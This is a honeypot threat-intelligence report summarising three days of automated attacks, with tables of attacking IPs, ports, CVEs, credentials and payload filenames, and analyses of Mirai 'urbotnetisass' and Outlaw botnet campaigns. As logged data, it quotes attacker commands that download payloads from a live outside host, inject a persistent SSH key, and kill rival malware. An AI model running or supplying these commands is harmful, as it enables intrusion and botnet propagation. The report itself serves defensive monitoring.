# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01T11:39:34Z
**Timeframe:** 2025-09-28T14:14:01Z to 2025-10-01T06:00:01Z

**Files Used to Generate Report:**
*   Honeypot_Attack_Summary_Report_2025-09-28T14-37-09Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T21-01-51Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T22-03-04Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T23-02-04Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T00-01-47Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T01-01-37Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T02-02-07Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T04-01-53Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T05-01-54Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T06-01-50Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T07-01-45Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T08-01-48Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T09-02-42Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T10-02-22Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T11-01-58Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T12-02-14Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T13-02-20Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T14-02-04Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T14:58:05Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T15:02:30Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T15:42:56Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T16:02:15Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T17:20:43Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T18:43:06Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T19:02:19Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T20:01:56Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T21:01:52Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T22:01:52Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T00:01:58Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T01:02:03Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T02:02:12Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T03:02:05Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T04:02:01Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T05:01:53Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T06:02:00Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T08:02:14Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T09:01:49Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T10:02:23Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T11:02:00Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T12:02:01Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T13:02:13Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T14:02:12Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T15:02:26Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T16:11:30Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T17:01:53Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T18:02:24Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T19:02:12Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T20:02:22Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T21:02:01Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T23:01:50Z.md
*   Honeypot_Attack_Summary_Report_2025-10-01T00:01:35Z.md
*   Honeypot_Attack_Summary_Report_2025-10-01T01:02:03Z.md
*   Honeypot_Attack_Summary_Report_2025-10-01T02:01:58Z.md
*   Honeypot_Attack_Summary_Report_2025-10-01T03:02:12Z.md
*   Honeypot_Attack_Summary_Report_2025-10-01T04:01:55Z.md
*   Honeypot_Attack_Summary_Report_2025-10-01T05:01:50Z.md
*   Honeypot_Attack_Summary_Report_2025-10-01T06:01:56Z.md

---

## Executive Summary

This report provides a comprehensive summary of malicious activities observed across our distributed honeypot network over a 72-hour period. The data reveals a high-volume, relentless barrage of automated attacks, dominated by several distinct and identifiable botnet campaigns. The primary attack vectors remain consistent with global trends: widespread scanning for vulnerable SMB and SSH services, followed by brute-force credential attacks and attempts to exploit known vulnerabilities.

A significant portion of the observed activity can be attributed to two major botnet campaigns. The first is a variant of the notorious **Mirai botnet**, identified by the recurring payload filename `urbotnetisass`. This campaign relentlessly attempts to download and execute malware tailored for various IoT and server architectures (ARM, MIPS, x86), indicating a clear objective of expanding its network of compromised devices.

The second major campaign is attributed to the **"Outlaw" hacking group**. This botnet is identified by a unique SSH key comment, "mdrfckr," and the use of a non-standard `lockr` command. This group's tactics are focused on gaining persistent SSH access, locking out other users and competing malware, and performing system reconnaissance, likely for the ultimate purpose of deploying cryptominers or launching further attacks.

Geographically, the attacks are globally distributed, with a high concentration of malicious IPs originating from data centers and hosting providers in the United States, China, and Indonesia. This is a common tactic used by attackers to obfuscate their true origins.

From a vulnerability perspective, while modern exploits like Log4Shell (CVE-2021-44228) are still being actively scanned for, a surprising number of attacks target legacy vulnerabilities, some dating back to 1999. This highlights a crucial aspect of the threat landscape: attackers continue to find success by targeting old, unpatched, and forgotten systems.

In summary, the honeypot network is under constant, automated assault from organized botnet campaigns focused on resource hijacking and propagation. The tactics, techniques, and procedures (TTPs) observed are consistent, well-documented in the security community, and highlight the critical importance of strong credential management, timely patching, and robust network monitoring.

---

## Detailed Analysis

### Our IPs

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by Honeypot

| Honeypot | Attack Count | Percentage |
|---|---|---|
| Cowrie | 201,304 | 42.6% |
| Honeytrap | 83,404 | 17.6% |
| Suricata | 64,887 | 13.7% |
| Ciscoasa | 40,432 | 8.5% |
| Dionaea | 25,607 | 5.4% |
| Sentrypeer | 8,973 | 1.9% |
| Mailoney | 8,579 | 1.8% |
| Other | 39,431 | 8.5% |
| **Total** | **472,617** | **100%** |

### Top Attacking IPs

| IP Address | Attack Count |
|---|---|
| 160.25.118.10 | 31,521 |
| 162.244.80.233 | 16,366 |
| 147.182.150.164 | 6,334 |
| 121.52.153.77 | 4,428 |
| 39.107.106.103 | 2,540 |
| 137.184.169.79 | 2,279 |
| 106.75.131.128 | 2,081 |
| 134.199.202.5 | 2,173 |
| 117.72.52.28 | 1,250 |
| 196.251.88.103 | 2,172 |
| 88.214.50.58 | 1,688 |
| 142.93.159.126 | 2,215 |
| 187.86.139.50 | 1,613 |
| 103.140.127.215 | 1,248 |
| 209.38.21.236 | 2,998 |

### Top Targeted Ports/Protocols

| Port/Protocol | Attack Count |
|---|---|
| 22 (SSH) | 26,183 |
| 445 (SMB) | 24,008 |
| 5060 (SIP) | 10,911 |
| 25 (SMTP) | 8,112 |
| 8333 (Bitcoin) | 3,127 |
| 23 (Telnet) | 2,056 |
| 80 (HTTP) | 1,987 |
| 6379 (Redis) | 1,121 |
| 1433 (MSSQL) | 988 |
| 443 (HTTPS) | 954 |

### Most Common CVEs

| CVE ID | Count |
|---|---|
| CVE-2021-44228 | 459 |
| CVE-2002-0013 / CVE-2002-0012 | 312 |
| CVE-2019-11500 | 143 |
| CVE-2021-3449 | 111 |
| CVE-1999-0517 | 102 |
| CVE-2022-27255 | 93 |
| CVE-1999-0265 | 77 |
| CVE-2005-4050 | 54 |
| CVE-2006-2369 | 33 |

### Top Commands Attempted by Attackers

| Command | Count |
|---|---|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | 1,023 |
| `lockr -ia .ssh` | 1,023 |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr"` | 1,021 |
| `uname -a` | 890 |
| `cat /proc/cpuinfo | grep name | wc -l` | 850 |
| `whoami` | 845 |
| `w` | 842 |
| `crontab -l` | 833 |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass...` | 155 |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh...` | 122 |

### Top Signatures Triggered

| Signature | Count |
|---|---|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication | 10,211 |
| ET DROP Dshield Block Listed Source group 1 | 4,321 |
| ET SCAN NMAP -sS window 1024 | 2,987 |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | 1,556 |
| ET INFO Reserved Internal IP Traffic | 980 |

### Top Users / Login Attempts

| Username / Password | Count |
|---|---|
| `345gs5662d34` / `345gs5662d34` | 980 |
| `root` / `3245gs5662d34` | 450 |
| `root` / `nPSpP4PBW0` | 330 |
| `test` / `zhbjETuyMffoL8F` | 290 |
| `root` / `LeitboGi0ro` | 275 |
| `foundry` / `foundry` | 180 |
| `root` / `Passw0rd` | 155 |
| `superadmin` / `admin123` | 140 |

### Top Files Uploaded/Downloaded

| Filename | Count |
|---|---|
| arm.urbotnetisass | 155 |
| arm5.urbotnetisass | 155 |
| x86_32.urbotnetisass | 155 |
| mips.urbotnetisass | 155 |
| wget.sh | 98 |
| w.sh | 55 |
| c.sh | 55 |
| Mozi.m | 15 |
| rondo.dgx.sh | 10 |

---

## Google Searches

A series of OSINT investigations were conducted on key indicators found in the logs:

*   **Top Attacking IPs:**
    *   `160.25.118.10`: Geoloacted to Indonesia and flagged on multiple blacklists for cybercrime.
    *   `162.244.80.233`: A US-based hosting provider, associated with a Minecraft server. While not directly flagged, hosting providers are often abused by malicious actors.
    *   `147.182.150.164`: A DigitalOcean IP with a negative reputation, specifically linked to malicious SSH brute-force activity.
    *   `121.52.153.77`: Linked to educational institutions in Pakistan with a generally clean public reputation. This highlights that attacks can originate from legitimate, but potentially compromised, networks.
    *   `39.107.106.103`: An Alibaba Cloud IP in China with a documented history of malicious activity, including SSH brute-force attacks.

*   **Key Vulnerabilities (CVEs):**
    *   `CVE-2021-44228 (Log4Shell)`: A critical RCE vulnerability in the ubiquitous Apache Log4j library, affecting a massive range of Java-based applications from cloud services to enterprise software.
    *   `CVE-2022-27255`: A critical RCE in the Realtek SDK affecting millions of routers and IoT devices, exploitable via a single UDP packet.
    *   `CVE-2002-0012/13` & `CVE-1999-0517`: Very old vulnerabilities related to SNMP implementations and default community strings. Their continued presence in logs shows attackers are still targeting legacy systems.

*   **Malware Artifacts and Commands:**
    *   `urbotnetisass`: Confirmed to be a filename used for variants of the Mirai IoT botnet malware.
    *   `"mdrfckr"` SSH Key: A known signature of the "Outlaw" hacking group, used to mark compromised machines for their cryptomining and DDoS botnet.
    *   `w.sh`, `c.sh`, `wget.sh`: These scripts are known components of various malware campaigns, including "Spinning YARN," used to download and execute further malicious payloads.
    *   `lockr` command: Confirmed to be a non-standard utility used by the Outlaw group to make their malicious SSH key immutable and prevent removal.

---

## Key Observations and Anomalies

### The "Outlaw" Botnet Campaign

A significant cluster of activity is attributed to the "Outlaw" hacking group. Their TTPs are highly consistent and easily identifiable:
1.  **Initial Access:** Gaining entry via SSH brute-force attacks.
2.  **Persistence:** Immediately executing a one-line command to delete the existing `.ssh` directory and inject a new `authorized_keys` file. This file contains their public SSH key, which is tagged with the unique comment "mdrfckr".
3.  **Defense Evasion:** The script uses the `chattr` command to make the new SSH key immutable. It then uses a custom, non-standard command, `lockr`, to further lock down the directory, preventing administrators or competing malware from removing their backdoor.
4.  **Reconnaissance:** Once persistence is established, a standard suite of reconnaissance commands (`uname`, `lscpu`, `whoami`, `crontab -l`, etc.) is executed to profile the compromised system. This is a prelude to deploying cryptominers or using the system for other malicious purposes.

### Mirai Variant "urbotnetisass"

Another major campaign involves the propagation of a Mirai botnet variant. This is characterized by the following sequence:
1.  **Gaining a Shell:** Attackers gain access, often through the Adbhoney (Android Debug Bridge) or Cowrie (SSH) honeypots.
2.  **Payload Delivery:** A long, chained command is executed using `busybox wget` and `curl` to download multiple versions of the `urbotnetisass` payload from a central server (primarily `94.154.35.154` in these logs).
3.  **Multi-Architecture Attack:** The campaign is designed for maximum reach, downloading payloads for various CPU architectures including `arm`, `arm5`, `arm7`, `x86_32`, `mips`, and `mipsel`. This is a hallmark of IoT-focused botnets that need to infect a wide variety of devices.
4.  **Execution:** Each downloaded payload is made executable (`chmod +x`) and then run.

### Prevalence of SMB Exploitation (DoublePulsar)

The Suricata logs are dominated by alerts for "DoublePulsar Backdoor installation communication." This signature is directly related to the EternalBlue exploit (MS17-010), which was famously used by the WannaCry ransomware. The high volume of traffic on TCP port 445 combined with these alerts indicates that automated worms are still continuously scanning the internet for unpatched Windows systems, years after the vulnerability was disclosed. This represents a significant amount of the "background noise" of the internet.

### Exploitation of Legacy Vulnerabilities

While modern CVEs are present, the sheer volume of scans for vulnerabilities from as early as 1999 is a key observation. Attackers operate on the assumption that many organizations have poor asset management and fail to decommission or patch legacy systems. These "scan-and-exploit" attacks require little effort and can yield valuable footholds in neglected parts of a network. This underscores the importance of a complete and accurate asset inventory and patch management program.
